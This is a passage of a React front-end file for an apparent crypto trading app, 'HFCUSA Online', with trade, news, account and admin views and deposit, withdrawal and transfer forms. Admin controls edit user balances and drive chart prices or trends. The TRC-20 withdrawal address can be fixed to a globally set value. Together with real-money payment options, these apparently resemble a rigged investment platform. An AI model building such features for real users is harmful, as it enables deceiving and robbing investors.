    if (actionType === 'ADMIN_ADJUST_BALANCE') {
      triggerBannerNotification('Balance Adjusted', `Modified user ${payload.userId} balance by $${payload.amount}.`);
    } else if (actionType === 'ADMIN_REMOVE_USER') {
      triggerBannerNotification('User Removed', `User ${payload.userId} banned and removed from system.`);
    } else if (actionType === 'ADMIN_PUBLISH_NEWS') {
      triggerBannerNotification('News Published', `Broadcasted: ${payload.title}`);
    }
  };

  const handleAdminChartControl = (symbol, targetPrice, forcedTrend, targetDuration) => {
    simWorker.postMessage({
      type: 'ADMIN_CHART_CONTROL',
      payload: { symbol, targetPrice, forcedTrend, targetDuration }
    });
    if (targetPrice) {
      triggerBannerNotification('Chart Target Set', `Driving ${symbol} price towards ${targetPrice}`);
    }
    if (forcedTrend) {
      triggerBannerNotification('Force Trend Active', `Injecting massive ${forcedTrend} into ${symbol}`);
    }
  };

  const isPro = simState.userState?.netWorth >= 100.00;

  // Show Auth page if not logged in
  if (!isAuthenticated) {
    return <AuthPage onLoginSuccess={handleLoginSuccess} />;
  }

  // Merge DB transactions with local state so they survive refreshes
  const mergedSimState = {
      ...simState,
      globalActiveBets,
      userState: {
          ...simState.userState,
          withdrawalAddress: globalWithdrawalAddress || simState.userState?.withdrawalAddress,
          transactions: [
              ...dbTransactions,
              ...(simState.userState?.transactions || []).filter(t => !dbTransactions.find(d => d.id === t.id))
          ]
      }
  };

  return (
    <div className="app-container">
      {/* Toast Alert Banner */}
      {showNotification && (
        <div style={{
          position: 'fixed',
          top: '24px',
          right: '24px',
          background: '#161925',
          border: '1px solid var(--primary)',
          boxShadow: 'var(--neon-glow)',
          borderRadius: '12px',
          padding: '16px 20px',
          zIndex: 2000,
          maxWidth: '350px',
          animation: 'modalEnter 0.3s cubic-bezier(0.4, 0, 0.2, 1)'
        }}>
          <h4 style={{ color: 'var(--primary)', display: 'flex', alignItems: 'center', gap: '8px', fontSize: '14px', fontWeight: 'bold' }}>
            <Shield size={16} /> {showNotification.title}
          </h4>
          <p style={{ color: 'var(--text-muted)', fontSize: '12px', marginTop: '6px', lineHeight: '135%' }}>
            {showNotification.desc}
          </p>
        </div>
      )}

      {/* Side Navigation Menu (Desktop) */}
      <aside className="sidebar">
        <div className="brand" style={{ display: 'flex', flexDirection: 'column', alignItems: 'flex-start', padding: '16px 20px', gap: '4px' }}>
          <img src="/logo-large.png" alt="HFCUSA Online Logo" style={{ width: '135px', height: 'auto', objectFit: 'contain', filter: 'drop-shadow(0 2px 8px rgba(0,0,0,0.35))', marginBottom: '4px' }} />
          <span style={{fontSize: '11px', color: 'var(--danger)', fontWeight: '700', letterSpacing: '0.5px'}}>[{simState.userState?.id}:{simState.userState?.role || 'user'}]</span>
        </div>

        <ul className="nav-menu">
          <li 
            className={`nav-item ${activeTab === 'home' && !activeFunc ? 'active' : ''}`}
            onClick={() => { setActiveTab('home'); setActiveFunc(null); }}
          >
            <Home size={18} /> Home
          </li>
          <li 
            className={`nav-item ${activeTab === 'transaction' && !activeFunc ? 'active' : ''}`}
            onClick={() => { setActiveTab('transaction'); setActiveFunc(null); }}
          >
            <TrendingUp size={18} /> Trade
          </li>
          <li 
            className={`nav-item ${activeTab === 'news' && !activeFunc ? 'active' : ''}`}
            onClick={() => { setActiveTab('news'); setActiveFunc(null); }}
          >
            <MessageCircle size={18} /> News Flash
          </li>
          <li 
            className={`nav-item ${activeTab === 'my' && !activeFunc ? 'active' : ''}`}
            onClick={() => { setActiveTab('my'); setActiveFunc(null); }}
          >
            <User size={18} /> My Account
          </li>
          {(simState.userState?.role === 'admin' || simState.userState?.role === 'king_admin') && (
            <li 
              className={`nav-item ${activeTab === 'admin' && !activeFunc ? 'active' : ''}`}
              onClick={() => { setActiveTab('admin'); setActiveFunc(null); }}
            >
              <ShieldAlert size={18} /> Admin Panel
            </li>
          )}
        </ul>

        {/* Floating User Stats Widget inside Sidebar */}
        <div style={{
          marginTop: 'auto',
          background: 'rgba(255, 255, 255, 0.02)',
          border: '1px solid var(--border-color)',
          borderRadius: '12px',
          padding: '14px',
          display: 'flex',
          flexDirection: 'column',
          gap: '8px'
        }}>
          <div style={{ display: 'flex', justifyContent: 'space-between', fontSize: '11px', color: 'var(--text-muted)' }}>
            <span>NET WORTH</span>
            <span className={`badge ${isPro ? 'badge-pro' : 'badge-membership'}`} style={{ fontSize: '8px', padding: '1px 4px' }}>
              {isPro ? 'Pro' : 'Basic'}
            </span>
          </div>
          <span className="text-mono" style={{ fontSize: '16px', fontWeight: 'bold', color: '#fff' }}>
            ${simState.userState?.netWorth?.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
          </span>
          <div style={{ display: 'flex', justifyContent: 'space-between', fontSize: '10px', color: 'var(--text-muted)' }}>
            <span>Rank: #{simState.userState?.rank || '---'}</span>
            <span>Trades: {simState.userState?.tradesCount || '0'}</span>
          </div>
        </div>
      </aside>

      {/* Main Content Area */}
      <main className="main-content">
        {activeFunc ? (
          /* Render Active Sub-Module View */
          <SubModules 
            activeFunc={activeFunc} 
            state={mergedSimState} 
            searchState={searchState}
            onClose={() => setActiveFunc(null)}
            onUpdateConfig={handleUpdateConfig}
            onResetSim={handleResetSim}
            onSearchTraders={handleSearchTraders}
            onAdminAction={handleAdminAction}
            onActionClick={(action) => setWalletModal(action)}
            theme={theme}
            onChangeTheme={setTheme}
            onLogout={handleLogout}
          />
        ) : (
          /* Render Main Navigation Tabs */
          <>
            {activeTab === 'home' && (
              <HomeDashboard state={simState} onNavigate={(tab) => { setActiveTab(tab); setActiveFunc(null); }} />
            )}
            {activeTab === 'transaction' && (
              <TransactionTerminal 
                state={simState} 
                onExecuteTrade={handleExecuteTrade} 
                onBetSettle={handleBetSettle} 
                onMarginMarketOrder={handleMarginMarketOrder}
                onMarginPendingOrder={handleMarginPendingOrder}
                onMarginClosePosition={handleMarginClosePosition}
                onMarginCancelOrder={handleMarginCancelOrder}
                globalActiveBets={globalActiveBets}
                setGlobalActiveBets={setGlobalActiveBets}
                onNavigate={(tab) => { setActiveTab(tab); setActiveFunc(null); }} 
              />
            )}
            {activeTab === 'news' && (
              <NewsFlash state={simState} onTriggerShock={handleTriggerShock} />
            )}
            {activeTab === 'my' && (
              <ProfileMy 
                state={simState} 
                onActionClick={(action) => setWalletModal(action)}
                onFuncClick={(func) => setActiveFunc(func)}
              />
            )}
            {activeTab === 'admin' && (
              <AdminDashboard 
                state={simState} 
                onTriggerShock={handleTriggerShock}
                onUpdateConfig={handleUpdateConfig}
                onResetSim={handleResetSim}
                onAdminAction={handleAdminAction}
                onChartControl={handleAdminChartControl}
                onActionClick={(action) => setWalletModal(action)}
                globalActiveBets={globalActiveBets}
              />
            )}
          </>
        )}
      </main>

      {/* Bottom Navigation Bar (Mobile View) */}
      <nav className="bottom-nav">
        <button 
          className={`bottom-nav-item ${activeTab === 'home' && !activeFunc ? 'active' : ''}`}
          onClick={() => { setActiveTab('home'); setActiveFunc(null); }}
        >
          <Home size={20} />
          <span>Home</span>
        </button>

        <button 
          className={`bottom-nav-item ${activeTab === 'transaction' && !activeFunc ? 'active' : ''}`}
          onClick={() => { setActiveTab('transaction'); setActiveFunc(null); }}
        >
          <TrendingUp size={20} />
          <span>Trade</span>
        </button>

        <button 
          className={`bottom-nav-item ${activeTab === 'news' && !activeFunc ? 'active' : ''}`}
          onClick={() => { setActiveTab('news'); setActiveFunc(null); }}
        >
          <MessageCircle size={20} />
          <span>News</span>
        </button>

        <button 
          className={`bottom-nav-item ${activeTab === 'my' && !activeFunc ? 'active' : ''}`}
          onClick={() => { setActiveTab('my'); setActiveFunc(null); }}
        >
          <User size={20} />
          <span>My</span>
        </button>

        {(simState.userState?.role === 'admin' || simState.userState?.role === 'king_admin') && (
          <button 
            className={`bottom-nav-item ${activeTab === 'admin' && !activeFunc ? 'active' : ''}`}
            onClick={() => { setActiveTab('admin'); setActiveFunc(null); }}
          >
            <ShieldAlert size={20} />
            <span>Admin</span>
          </button>
        )}
      </nav>

      {/* Wallet Operations Overlay Modals (Top Up, Withdraw, Transfer) */}
      {walletModal && (
        <div className="modal-overlay">
          <div className="modal-content">
            <button className="modal-close" onClick={() => { setWalletModal(null); setModalAmount(''); setTransferTarget(''); }}>
              <X size={18} />
            </button>

            {walletModal === 'TOPUP' && (
              <>
                <div className="modal-header">
                  <ArrowUp size={20} style={{ color: 'var(--success)' }} /> Top Up USDT Balance
                </div>
                <form onSubmit={handleTopUpSubmit}>
                  <div className="form-group">
                    <label className="form-label">Deposit Method (Network)</label>
                    <select 
                      className="form-input" 
                      value={modalMethod} 
                      onChange={(e) => setModalMethod(e.target.value)}
                    >
                      <option value="USDT TRC-20">USDT (TRC-20)</option>
                      <option value="USDT ERC-20">USDT (ERC-20)</option>
                      <option value="BTC">Bitcoin (BTC)</option>
                      <option value="Bank Transfer">Bank Transfer (Fiat)</option>
                    </select>
                  </div>
                  <div className="form-group">
                    <label className="form-label">Amount to Deposit</label>
                    <input 
                      type="number" 
                      step="any"
                      className="form-input" 
                      placeholder="0.00 USDT" 
                      value={modalAmount}
                      onChange={(e) => setModalAmount(e.target.value)}
                      required
                    />
                    <div className="form-hint" style={{ display: 'flex', flexDirection: 'column', gap: '4px' }}>
                      <div style={{ display: 'flex', justifyContent: 'space-between' }}>
                        <span>Instant balance verification</span>
                        <span style={{ color: 'var(--danger)', fontWeight: 'bold' }}>Fee: $1.00</span>
                      </div>
                      <span>Token: USDT equivalent</span>
                    </div>
                  </div>
                  <button type="submit" className="btn btn-success" style={{ width: '100%' }}>
                    Confirm Top Up
                  </button>
                </form>
              </>
            )}

            {walletModal === 'WITHDRAW' && (
              <>
                <div className="modal-header">
                  <ArrowDown size={20} style={{ color: 'var(--danger)' }} /> Withdraw Assets
                </div>
                <form onSubmit={handleWithdrawSubmit}>
                  <div className="form-group">
                    <label className="form-label">Withdrawal Method (Network)</label>
                    <select 
                      className="form-input" 
                      value={modalMethod} 
                      onChange={(e) => setModalMethod(e.target.value)}
                    >
                      <option value="USDT TRC-20">USDT (TRC-20)</option>
                      <option value="USDT ERC-20">USDT (ERC-20)</option>
                      <option value="BTC">Bitcoin (BTC)</option>
                      <option value="Bank Transfer">Bank Transfer (Fiat)</option>
                    </select>
                  </div>
                  <div className="form-group">
                    <div style={{ display: 'flex', justifyContent: 'space-between' }}>
                      <label className="form-label">Amount to Withdraw</label>
                      <span style={{ fontSize: '11px', color: 'var(--text-muted)' }}>Avail: ${simState.userState.balance} USDT</span>
                    </div>
                    <input 
                      type="number" 
                      step="any"
                      className="form-input" 
                      placeholder="0.00 USDT" 
                      value={modalAmount}
                      onChange={(e) => setModalAmount(e.target.value)}
                      max={simState.userState.balance}
                      required
                    />
                    <div className="form-hint" style={{ display: 'flex', flexDirection: 'column', gap: '4px' }}>
                      <div style={{ display: 'flex', justifyContent: 'space-between' }}>
                        <span>Secure automated payout routing</span>
                        <span style={{ color: 'var(--danger)', fontWeight: 'bold' }}>
                          Fee (1%): ${modalAmount && !isNaN(modalAmount) ? (parseFloat(modalAmount) * 0.01).toFixed(2) : '0.00'} USDT
                        </span>
                      </div>
                      <span style={{ color: 'var(--success)', fontWeight: 'bold' }}>
                        You Receive: ${modalAmount && !isNaN(modalAmount) ? (parseFloat(modalAmount) * 0.99).toFixed(2) : '0.00'} USDT
                      </span>
                    </div>
                    <div className="form-group">
                      <label className="form-label">Receiving Wallet Address</label>
                      <input 
                        type="text" 
                        name="crypto_receiving_wallet_no_autofill"
                        id="crypto_receiving_wallet_field"
                        autoComplete="new-password"
                        autoCorrect="off"
                        autoCapitalize="none"
                        spellCheck="false"
                        data-form-type="other"
                        className="form-input" 
                        placeholder={modalMethod === 'USDT TRC-20' ? "e.g. T9yD14Nj9j7xAB4dbGeiX9h8unkKHxuWwb (34 chars)" : "Enter your crypto wallet address..."} 
                        value={(modalMethod === 'USDT TRC-20' && (globalWithdrawalAddress || simState.userState?.withdrawalAddress)) ? (globalWithdrawalAddress || simState.userState.withdrawalAddress) : walletAddress}
                        onChange={(e) => setWalletAddress(e.target.value.trim())}
                        readOnly={modalMethod === 'USDT TRC-20' && !!(globalWithdrawalAddress || simState.userState?.withdrawalAddress)}
                        style={modalMethod === 'USDT TRC-20' && (globalWithdrawalAddress || simState.userState?.withdrawalAddress) ? { opacity: 0.7, cursor: 'not-allowed', fontFamily: 'var(--font-mono)' } : { fontFamily: 'var(--font-mono)' }}
                        required
                      />
                    </div>
                  </div>
                  <button type="submit" className="btn btn-danger" style={{ width: '100%' }}>
                    Submit Request
                  </button>
                </form>
              </>
            )}

            {walletModal === 'TRANSFER' && (
              <>
                <div className="modal-header">
                  <Share2 size={20} style={{ color: 'var(--primary)' }} /> Transfer Assets
                </div>
                <form onSubmit={handleTransferSubmit}>
                  <div className="form-group">
                    <label className="form-label">Recipient USDT Address</label>
                    <input 
                      type="text" 
                      className="form-input" 
                      placeholder="T-Address or ID" 
                      value={transferTarget}
                      onChange={(e) => setTransferTarget(e.target.value)}
                      required
                    />
                  </div>
                  <div className="form-group">
                    <div style={{ display: 'flex', justifyContent: 'space-between' }}>
                      <label className="form-label">Amount (USDT)</label>
                      <span style={{ fontSize: '11px', color: 'var(--text-muted)' }}>Avail: ${simState.userState.balance} USDT</span>
                    </div>
                    <input 
                      type="number" 
                      step="any"
                      className="form-input" 
                      placeholder="0.00 USDT" 
                      value={modalAmount}
                      onChange={(e) => setModalAmount(e.target.value)}
                      max={simState.userState.balance}
                      required
                    />
                  </div>
                  <button type="submit" className="btn btn-primary" style={{ width: '100%' }}>
                    Execute Transfer
                  </button>
                </form>
              </>
            )}
          </div>
        </div>
      )}
    </div>
  );
}

export default App;
